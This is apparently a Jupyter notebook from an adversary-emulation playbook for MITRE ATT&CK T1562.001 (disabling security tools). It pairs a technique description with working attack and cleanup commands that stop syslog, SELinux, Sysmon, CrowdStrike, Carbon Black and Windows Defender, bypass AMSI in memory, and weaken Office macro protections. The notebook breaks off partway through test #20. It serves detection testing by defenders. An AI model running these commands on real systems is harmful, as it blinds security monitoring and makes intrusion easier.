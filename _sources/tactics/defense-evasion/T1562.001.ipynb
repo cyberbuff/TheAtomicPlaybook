{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8f05bb9d",
   "metadata": {},
   "source": "# T1562.001 - Disable or Modify Tools\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)"
  },
  {
   "cell_type": "markdown",
   "id": "724e2def",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "54453680",
   "metadata": {},
   "source": "### Atomic Test #1 - Disable syslog\nDisables syslog collection\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Package with rsyslog must be on system\n\n##### Check Prereq Commands:\n```sh\nif (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\nsudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog) \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2126af71",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "56ce7cb8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsystemctl stop rsyslog ; systemctl disable rsyslog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be1d7681",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d8363fb5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsystemctl start rsyslog ; systemctl enable rsyslog\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7ec9a2e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "062a9af4",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Disable syslog (freebsd)",
    "Disables syslog collection\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nservice syslogd stop\nsysrc syslogd_enable=\"NO\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1408649e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d12a866e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsysrc syslogd_enable=\"YES\"\nservice syslogd start\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd1fe9ac",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "314564ec",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Disable Cb Response",
    "Disable the Cb Response service\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3f56e76",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "d9f4685e",
   "metadata": {},
   "source": "### Atomic Test #4 - Disable SELinux\nDisables SELinux enforcement\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: SELinux must be installed\n\n##### Check Prereq Commands:\n```sh\nwhich setenforce\n\n```\n##### Get Prereq Commands:\n```sh\necho \"SELinux is not installed\"; exit 1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce7776c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "166e574c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsetenforce 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2dcfd86",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5c6efb4f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsetenforce 1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dbe0942",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2a7ccd29",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Stop Crowdstrike Falcon on Linux",
    "Stop and disable Crowdstrike Falcon on Linux\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "789a5caa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "118bba18",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a98fd5ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1c9af938",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable Carbon Black Response",
    "Disables Carbon Black Response\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5b7ebe8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "5a32f0e6",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43c87feb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bef07860",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Disable LittleSnitch",
    "Disables LittleSnitch\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "630c2cf6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "2c0de1de",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aaaeddea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "48847d3e",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Disable OpenDNS Umbrella",
    "Disables OpenDNS Umbrella\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52c3efe6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "8e7fa12c",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf320542",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0c1c06cc",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Disable macOS Gatekeeper",
    "Disables macOS Gatekeeper\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo spctl --master-disable\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "998970e5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "e00a1d94",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo spctl --master-enable\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86ad3371",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0fa16183",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Stop and unload Crowdstrike Falcon on macOS",
    "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e079e7dd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "e05c84c8",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b43f66f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "575658b4",
   "metadata": {},
   "source": "### Atomic Test #11 - Unload Sysmon Filter Driver\nUnloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sysmon must be downloaded\n\n##### Check Prereq Commands:\n```cmd\nif (-not (cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") -or (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\" -Force\n\n```\n##### Description: sysmon must be Installed\n\n##### Check Prereq Commands:\n```cmd\nif(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nif(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}\n\n```\n##### Description: sysmon filter must be loaded\n\n##### Check Prereq Commands:\n```cmd\nif(fltmc.exe filters | findstr SysmonDrv) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nif(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70dc95ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "faea2120",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nfltmc.exe unload SysmonDrv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6263a837",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "2e60b23b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb8d5cc1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cc9d342b",
   "metadata": {},
   "source": "### Atomic Test #12 - Uninstall Sysmon\nUninstall Sysinternals Sysmon for Defense Evasion\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sysmon executable must be available\n\n##### Check Prereq Commands:\n```cmd\nif(cmd /c where sysmon) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n$parentpath = Split-Path \"PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n\n```\n##### Description: Sysmon must be installed\n\n##### Check Prereq Commands:\n```cmd\nif(cmd /c sc query sysmon) { exit 0} else { exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\ncmd /c sysmon -i -accepteula\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aff0607b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f95a230b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsysmon -u\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc1874ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "6f543037",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsysmon -i -accepteula >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17791994",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "db89ac08",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - AMSI Bypass - AMSI InitFailed",
    "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d8ac7c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "ca1c967b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06a51168",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e561c25d",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - AMSI Bypass - Remove AMSI Provider Reg Key",
    "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nRemove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d20a795",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "d21313b7",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nNew-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f7e0a6e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c28c2e79",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - Disable Arbitrary Security Windows Service",
    "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "610e5230",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "9e57c655",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc.exe config McAfeeDLPAgentService start= auto >nul 2>&1\nnet.exe start McAfeeDLPAgentService >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d82d2b61",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c7b84181",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - Tamper with Windows Defender ATP PowerShell",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ef43cb1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "6b7bccb9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89dd6029",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3d54b858",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Tamper with Windows Defender Command Prompt",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6edb399",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "96ca129d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "252d2a5e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "72b313ce",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Tamper with Windows Defender Registry",
    "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8bde1b2b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "02c0bdbc",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "622458e2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 18 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0abddb66",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Disable Microsoft Office Security Features",
    "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ff6a2fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "443711a5",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7383e8b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 19 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4b04a953",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Remove Windows Defender Definition Files",
    "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n```"
   ]
  },
  {
   "cell_type": "code",
